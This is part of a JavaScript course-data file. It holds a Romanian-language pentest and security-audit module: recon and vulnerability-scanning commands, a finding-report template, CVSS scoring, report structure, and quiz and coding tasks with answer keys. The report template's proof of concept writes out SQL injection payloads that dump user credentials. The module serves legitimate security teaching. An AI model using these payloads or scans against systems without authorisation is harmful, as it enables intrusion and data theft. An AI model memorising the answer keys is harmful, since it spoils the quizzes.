        content: "**Faza 1 — Reconnaissance:**\n\n```bash\n# OSINT pe organizatie:\nwhois companie.ro\nnslookup companie.ro\ndig any companie.ro\ndnsenum companie.ro  # subdomenii, MX, NS\n\n# Subdomenii prin certificate transparency:\ncurl -s \"https://crt.sh/?q=%.companie.ro&output=json\" | jq '.[].name_value' | sort -u\n\n# Google dorks:\nsite:companie.ro filetype:pdf\nsite:companie.ro inurl:admin\nsite:github.com org:companie-ro\n\n# Shodan (necesita API key):\nshodan search org:\"Companie SA\" product:nginx\nshodan host 185.1.2.3\n```\n\n**Faza 2 — Scanning:**\n```bash\n# Nmap comprehensive:\nnmap -sV -sC -p- --min-rate 1000 -oA scan_results companie.ro\nnmap --script vuln companie.ro\n\n# Web fingerprinting:\nwhatweb https://companie.ro\nwappalyzer https://companie.ro  # (browser extension sau CLI)\n\n# SSL/TLS check:\ntestssl.sh companie.ro\n# Detecteaza: protocol version (TLS 1.0?), cipher suites slabe, certificate issues\n\n# Headers de securitate:\ncurl -I https://companie.ro | grep -iE 'x-frame|content-security|strict-transport|x-content'\n```\n\n**Faza 3 — Vulnerability Analysis:**\n```bash\n# Nikto — web server:\nnikto -h https://companie.ro -Format htm -o nikto_report.html\n\n# Nuclei — template-based scanning (rapid, precis):\nnuclei -u https://companie.ro -t cves/ -t exposures/ -severity high,critical\nnuclei -u https://companie.ro -t misconfiguration/\n\n# OWASP ZAP — web app:\nzap-baseline.py -t https://companie.ro -r zap_report.html\n```\n\n**Interview tip:** Nuclei e mai modern decat Nikto — template-based cu CVE-uri actualizate. Comunitate mare, gratuit, rapid. Preferat in bug bounty si audituri moderne."
      },
      {
        order: 3,
        title: "Findings, CVSS Scoring si Remediation",
        content: "**Documentarea finding-urilor** e cel mai important deliverable.\n\n**Template Finding:**\n```markdown\n## FINDING #001 — SQL Injection in /api/search\n\n**Severitate:** CRITICAL\n**CVSS Score:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)\n**CWE:** CWE-89 (SQL Injection)\n**Afectat:** https://companie.ro/api/search?q=\n\n**Descriere:**\nParametrul `q` din endpoint-ul /api/search nu este sanitizat,\npermitand injectarea de comenzi SQL arbitrare.\n\n**Proof of Concept:**\n```\nGET /api/search?q=' OR 1=1-- -\nRaspuns: Toate inregistrarile din baza de date returnate\n\nGET /api/search?q=' UNION SELECT username,password FROM users--\nRaspuns: Credentiale utilizatori expuse\n```\n\n**Impact:**\n- Exfiltrare completa a bazei de date (credentiale, date personale)\n- Potential pentru Remote Code Execution (xp_cmdshell pe MSSQL)\n- Compromiterea completa a aplicatiei\n\n**Remediere:**\n1. Folositi prepared statements (parameterized queries) IMEDIAT\n2. Implementati input validation (whitelist)\n3. Aplicati principiul least privilege pe userul de DB\n4. Adaugati WAF cu reguli anti-SQLi\n\n**Timeline remediere recomandata:** 24-48 ore (CRITICAL)\n```\n\n**CVSS v3.1 Calculator:**\n```\nAV (Attack Vector): N=Network, A=Adjacent, L=Local, P=Physical\nAC (Attack Complexity): L=Low, H=High\nPR (Privileges Required): N=None, L=Low, H=High\nUI (User Interaction): N=None, R=Required\nS (Scope): U=Unchanged, C=Changed\nC/I/A (Impact): N=None, L=Low, H=High\n\nExemple:\nSQLi fara auth: AV:N/AC:L/PR:N/UI:N → Base Score: 9.8 (CRITICAL)\nXSS reflected: AV:N/AC:L/PR:N/UI:R → Base Score: 6.1 (MEDIUM)\nSSH brute force reusit: AV:N/AC:H/PR:N/UI:N → Score: 8.1 (HIGH)\n```\n\n**Interview tip:** CVSS 3.1 e standardul curent (nu 2.0). CVSS 4.0 e nou (2023) si adauga metrici suplimentare. Stii sa calculezi si sa justifici un scor CVSS e esential in pentest."
      },
      {
        order: 4,
        title: "Raportul final, Executive Summary si Remediation Tracking",
        content: "**Structura raportului de audit complet:**\n\n```\n1. COPERTA\n   - Titlu, client, data, versiune, clasificare (CONFIDENTIAL)\n   - Autorii si calificarile (OSCP, CISSP, CEH)\n\n2. EXECUTIVE SUMMARY (1-2 pagini)\n   - Scop si metodologie (fara jargon tehnic)\n   - Overall risk rating: CRITICAL/HIGH/MEDIUM/LOW\n   - Numar findings per severitate\n   - Top 3 riscuri cu impact business\n   - Recomandari prioritare\n\n3. SCOPE SI METODOLOGIE\n   - Sisteme testate, date, limitari\n   - Tool-uri folosite\n   - Standarde aplicate (OWASP, PTES, NIST)\n\n4. FINDINGS TEHNICE\n   Per finding: titlu, severitate, CVSS, CWE,\n   descriere, PoC, impact, remediere, timeline\n\n5. APPENDIX\n   - Raw scan outputs (Nmap, Nikto etc.)\n   - Screenshots PoC\n   - Tool list\n   - Referinte (CVE, OWASP)\n\n6. ATTESTATION\n   - Semnatura investigatorilor\n   - Disclaimer legal\n```\n\n**Remediation Tracking:**\n```python\n# Script simplu tracking remediere:\nfindings = [\n    {\"id\": \"F001\", \"titlu\": \"SQL Injection\", \"severitate\": \"CRITICAL\",\n     \"status\": \"OPEN\", \"deadline\": \"2025-05-18\", \"owner\": \"Dev Team\"},\n    {\"id\": \"F002\", \"titlu\": \"XSS Reflected\", \"severitate\": \"MEDIUM\",\n     \"status\": \"IN_PROGRESS\", \"deadline\": \"2025-05-23\", \"owner\": \"Dev Team\"},\n    {\"id\": \"F003\", \"titlu\": \"Security Headers lipsa\", \"severitate\": \"LOW\",\n     \"status\": \"FIXED\", \"deadline\": \"2025-05-20\", \"owner\": \"DevOps\"},\n]\n\nfrom datetime import datetime\n\ndef status_remediere(findings):\n    today = datetime.today().strftime('%Y-%m-%d')\n    for f in findings:\n        overdue = f['deadline'] < today and f['status'] != 'FIXED'\n        print(f\"[{f['severitate']:8}] {f['id']}: {f['titlu'][:40]:40} \"\n              f\"| {f['status']:12} | {'OVERDUE!' if overdue else 'OK':10}\")\n\nstatus_remediere(findings)\n```\n\n**Interview tip:** Retestarea (retest) dupa remediere e obligatorie pentru vulnerabilitatile CRITICAL/HIGH. Emiti un Remediation Certificate care confirma ca vulnerabilitatile au fost rezolvate."
      }
    ],
    tasks: [
      {
        number: 1,
        name: "Audit scope",
        question: "De ce definirea clara a scope-ului inainte de un audit de securitate este critica?",
        options: [
          "E o formalitate",
          "Previne testarea sistemelor neautorizate (legal), asigura acoperire completa si previne dispute cu clientul legat de ce a fost/nu a fost testat",
          "Accelereaza testarea",
          "Reduce costul"
        ],
        answer: "Previne testarea sistemelor neautorizate (legal), asigura acoperire completa si previne dispute cu clientul legat de ce a fost/nu a fost testat",
        explanation: "Scope out-of-bound = potential infractiune. Scope vag = dispute post-audit (\"de ce nu ati testat X?\"). Scope clar + semnat = protectie legala pentru ambele parti.",
        difficulty: "medium"
      },
      {
        number: 2,
        name: "CVSS calculation",
        question: "Ce CVSS score are o vulnerabilitate SQL Injection exploatabila remote, fara autentificare, cu impact complet asupra datelor?",
        options: [
          "4.0 — Medium",
          "7.5 — High",
          "9.8 — Critical (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)",
          "6.5 — Medium"
        ],
        answer: "9.8 — Critical (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)",
        explanation: "AV:N (Network) + AC:L (Low complexity) + PR:N (fara privilegii) + UI:N (fara interactiune user) + C:H/I:H/A:H = 9.8 CRITICAL. Formula CVSS 3.1.",
        difficulty: "medium"
      },
      {
        number: 3,
        name: "Executive Summary",
        question: "Ce nu trebuie sa contina Executive Summary-ul din raportul de audit (pentru CEO/CFO)?",
        options: [
          "Riscul general al organizatiei",
          "Detalii tehnice de exploatare (cod PoC, payload-uri SQL, output nmap brut) — acestea merg in sectiunea tehnica",
          "Impactul business",
          "Prioritatile de remediere"
        ],
        answer: "Detalii tehnice de exploatare (cod PoC, payload-uri SQL, output nmap brut) — acestea merg in sectiunea tehnica",
        explanation: "Executive Summary: pentru management non-tehnic. Limbaj business, impact financiar/reputational, riscuri prioritare, investitii recomandate. PoC tehnic = Appendix.",
        difficulty: "easy"
      },
      {
        number: 4,
        name: "Nuclei scan",
        question: "Scrie comanda Nuclei pentru a scana https://target.ro pentru CVE-uri si misconfigurari de severitate HIGH si CRITICAL.",
        type: "coding",
        language: "bash",
        starterCode: "# Scaneaza https://target.ro\n# Template-uri: cves/ si misconfiguration/\n# Severitate: high, critical\n# Output in fisier results.txt\n# Hint: nuclei -u -t -severity -o",
        options: [],
        answer: "",
        explanation: "nuclei -u https://target.ro -t cves/ -t misconfiguration/ -severity high,critical -o results.txt",
        difficulty: "medium",
        expectedOutput: ""
      },
      {
        number: 5,
        name: "testssl usage",
        question: "Ce verifica testssl.sh si de ce e important in un audit web?",
        options: [
          "Testeaza viteza SSL",
          "Detecteaza: versiuni TLS vulnerabile (1.0/1.1), cipher suites slabe, certificate expirate, vulnerabilitati (POODLE, BEAST, Heartbleed)",
          "Instaleaza certificate SSL",
          "Configureaza HTTPS"
        ],
        answer: "Detecteaza: versiuni TLS vulnerabile (1.0/1.1), cipher suites slabe, certificate expirate, vulnerabilitati (POODLE, BEAST, Heartbleed)",
        explanation: "TLS 1.0 si 1.1 sunt deprecate (2021). RC4, DES = cipher suites sparte. testssl.sh testeaza 300+ configuratii SSL/TLS, inclusiv CVE-uri specifice.",
        difficulty: "medium"
      },
      {
        number: 6,
        name: "Recon script",
        question: "Scrie un script bash care face reconnaissance initial pe un domeniu: WHOIS, subdomenii din crt.sh si scanare header-e HTTP.",
        type: "coding",
        language: "bash",
        starterCode: "#!/bin/bash\n# Script reconnaissance initial\n# Argument: $1 = domeniu (ex: example.com)\n\nDOMENIU=\"$1\"\n\necho \"=== WHOIS ===\"\n# whois\n\necho \"=== SUBDOMENII (crt.sh) ===\"\n# curl crt.sh API si extrage subdomeniile\n\necho \"=== SECURITY HEADERS ===\"\n# curl -I si filtreaza headerele de securitate",
        options: [],
        answer: "",
        explanation: "whois $DOMENIU; curl -s \"https://crt.sh/?q=%.${DOMENIU}&output=json\" | jq -r '.[].name_value' | sort -u; curl -sI \"https://${DOMENIU}\" | grep -iE 'x-frame|content-security|strict-transport'",
        difficulty: "medium",
        expectedOutput: ""
      },
      {
        number: 7,
        name: "Finding documentation",
        question: "Ce elemente OBLIGATORII trebuie documentate pentru fiecare finding dintr-un raport de pentest?",
        options: [
          "Doar titlul si severitatea",
          "Titlu, severitate CVSS, CWE, descriere, Proof of Concept, impact business, remediere, timeline",
          "Numai codul de atac",
          "Doar recomandarea de remediere"
        ],
        answer: "Titlu, severitate CVSS, CWE, descriere, Proof of Concept, impact business, remediere, timeline",
        explanation: "PoC dovedeste ca vulnerabilitatea e reala (nu false positive). CVSS justifica prioritizarea. CWE = categorie standard. Timeline = urgenta remedierii bazata pe severitate.",
        difficulty: "easy"
      },
      {
        number: 8,
        name: "CIS Controls",
        question: "Care sunt primele 3 CIS Controls v8 si de ce sunt prioritizate?",
        options: [
          "Firewall, Antivirus, Backup",
          "Inventory of Authorized Devices, Inventory of Authorized Software, Data Protection — nu poti proteja ce nu stii ca exista",
          "Encryption, MFA, Logging",
          "Patching, Training, Monitoring"
        ],
        answer: "Inventory of Authorized Devices, Inventory of Authorized Software, Data Protection — nu poti proteja ce nu stii ca exista",
        explanation: "CIS Controls: CIS1 = Hardware inventory, CIS2 = Software inventory, CIS3 = Data protection. Principiul: nu poti securiza ce nu cunosti. Shadow IT = risc mare.",
        difficulty: "medium"
      },
      {
        number: 9,
        name: "Remediation tracking Python",
        question: "Scrie un script Python care citeste o lista de findings JSON si afiseaza care sunt OVERDUE (deadline trecut si status != FIXED).",
        type: "coding",
        language: "python",
        starterCode: "from datetime import datetime\n\nfindings = [\n    {\"id\": \"F001\", \"severitate\": \"CRITICAL\", \"status\": \"OPEN\", \"deadline\": \"2025-05-10\"},\n    {\"id\": \"F002\", \"severitate\": \"HIGH\", \"status\": \"FIXED\", \"deadline\": \"2025-05-15\"},\n    {\"id\": \"F003\", \"severitate\": \"MEDIUM\", \"status\": \"IN_PROGRESS\", \"deadline\": \"2025-05-20\"},\n]\n\ndef afiseaza_overdue(findings):\n    today = datetime.today().strftime('%Y-%m-%d')\n    # itereaza si afiseaza finding-urile overdue",
        options: [],
        answer: "",
        explanation: "for f in findings: if f['deadline'] < today and f['status'] != 'FIXED': print(f\"OVERDUE: [{f['severitate']}] {f['id']} - deadline: {f['deadline']}\")",
        difficulty: "medium",
        expectedOutput: ""
      },
      {
        number: 10,
        name: "ISO 27001 vs SOC2",
        question: "Ce diferenta principala exista intre ISO 27001 si SOC2?",
        options: [
          "Sunt identice",
          "ISO 27001: certificare internationala ISMS process-based (cum gestionezi securitatea); SOC2: audit american bazat pe trust service criteria (cum protejezi datele clientilor)",
          "ISO 27001 e pentru cloud, SOC2 pentru on-premise",
          "SOC2 e mai vechi"
        ],
        answer: "ISO 27001: certificare internationala ISMS process-based (cum gestionezi securitatea); SOC2: audit american bazat pe trust service criteria (cum protejezi datele clientilor)",
        explanation: "ISO 27001: structura ISMS (Annex A: 93 controale). SOC2: Security, Availability, Processing Integrity, Confidentiality, Privacy criteria. SOC2 Type II = 6-12 luni de audit continuu.",
        difficulty: "hard"
      },
      {
        number: 11,
        name: "Retest importance",
        question: "De ce este obligatorie retestarea (retest) dupa remedierea vulnerabilitatilor CRITICAL?",
        options: [
          "E o formalitate",
          "Confirma ca remedierea a rezolvat efectiv vulnerabilitatea si nu a introdus vulnerabilitati noi — clientul primeste Remediation Certificate",
          "E ceruta de GDPR",
          "Reduce costul auditului"
        ],
        answer: "Confirma ca remedierea a rezolvat efectiv vulnerabilitatea si nu a introdus vulnerabilitati noi — clientul primeste Remediation Certificate",
        explanation: "Fix-ul poate fi partial (protejat doar o parte din vectori) sau poate introduce regresii. Retest = confirmare obiectiva. Remediation Certificate = dovada formala pentru compliance.",
        difficulty: "medium"
      },
      {
        number: 12,
        name: "Security headers audit",
        question: "Scrie un script bash care verifica prezenta tuturor headerelor de securitate importante pentru un site web.",
        type: "coding",
        language: "bash",
        starterCode: "#!/bin/bash\n# Verifica headerele de securitate pentru $1 (URL)\n# Verifica: Strict-Transport-Security, Content-Security-Policy,\n#           X-Frame-Options, X-Content-Type-Options, Referrer-Policy\n# Afiseaza: PREZENT sau LIPSA pentru fiecare\n\nURL=\"$1\"\nHEADERS=$(curl -sI \"$URL\")\n\n# completeaza verificarile",
        options: [],
        answer: "",
        explanation: "for header in 'Strict-Transport-Security' 'Content-Security-Policy' 'X-Frame-Options' 'X-Content-Type-Options' 'Referrer-Policy'; do echo $HEADERS | grep -qi \"$header\" && echo \"PREZENT: $header\" || echo \"LIPSA: $header\"; done",
        difficulty: "medium",
        expectedOutput: ""
      },
      {
        number: 13,
        name: "Vulnerability disclosure",
        question: "Ce este Responsible Disclosure (Coordinated Vulnerability Disclosure) si de ce e important?",
        options: [
          "Publicarea imediata a vulnerabilitatii",
          "Raportarea privata catre vanzator, acordand timp de remediere (90 zile standard) inainte de publicare publica — echilibru intre transparenta si protectia utilizatorilor",
          "Vanzarea vulnerabilitatilor catre guverne",
          "Pastrarea secreta permanenta a vulnerabilitatilor"
        ],
        answer: "Raportarea privata catre vanzator, acordand timp de remediere (90 zile standard) inainte de publicare publica — echilibru intre transparenta si protectia utilizatorilor",
        explanation: "Google Project Zero: 90 zile deadline. CERT/CC: coordineaza disclosures complexe. Full disclosure imediat = zero-day public = utilizatori expusi. Responsible = vanzator are timp sa patcheze.",
        difficulty: "medium"
      },
      {
        number: 14,
        name: "Bug bounty programs",
        question: "Ce este un Bug Bounty Program si ce avantaje ofera fata de un audit traditional?",
        options: [
          "E mai ieftin mereu",
          "Cercetatori independenti raporteaza vulnerabilitati continuu in schimbul recompenselor — testare continua, perspectiva diversa, pay-per-result",
          "E mai rapid",
          "Inlocuieste auditurile"
        ],
        answer: "Cercetatori independenti raporteaza vulnerabilitati continuu in schimbul recompenselor — testare continua, perspectiva diversa, pay-per-result",
        explanation: "Bug Bounty: HackerOne, Bugcrowd. Avantaje: testare 24/7, mii de cercetatori, platesti doar pentru vulnerabilitati valide. Audit traditional: garantat, in-depth, acces la cod sursa.",
        difficulty: "medium"
      },
      {
        number: 15,
        name: "Complete audit checklist",
        question: "Scrie un checklist complet de securitate web (minim 10 puncte) acoperind OWASP Top 10 si security headers.",
        type: "coding",
        language: "javascript",
        starterCode: "// Checklist audit securitate web complet\n// Acopera: OWASP Top 10, security headers, autentificare, criptare\n\nconst checklistAudit = [\n    // Completeaza cu minim 10 puncte de verificat\n    // Format: { categorie, verificare, severitate, tool }\n];",
        options: [],
        answer: "",
        explanation: "[{cat:'OWASP',check:'SQL Injection - input parametrizat',sev:'CRITICAL',tool:'sqlmap'},{cat:'OWASP',check:'XSS - output encoding',sev:'HIGH',tool:'burp'},{cat:'Auth',check:'MFA activat',sev:'HIGH'},{cat:'Headers',check:'CSP prezent',sev:'MEDIUM'},{cat:'TLS',check:'TLS 1.2+ only',sev:'HIGH',tool:'testssl'},{cat:'Auth',check:'Brute force protection',sev:'HIGH'},{cat:'Data',check:'Criptare la repaus',sev:'HIGH'},{cat:'OWASP',check:'Dependency vulnerabilitati',sev:'HIGH',tool:'snyk'},{cat:'Config',check:'Default credentials schimbate',sev:'CRITICAL'},{cat:'Logging',check:'Audit log activat',sev:'MEDIUM'}]",
        difficulty: "hard",
        expectedOutput: ""
      }
    ]
  }
];

module.exports = { cybersecExtra2 };
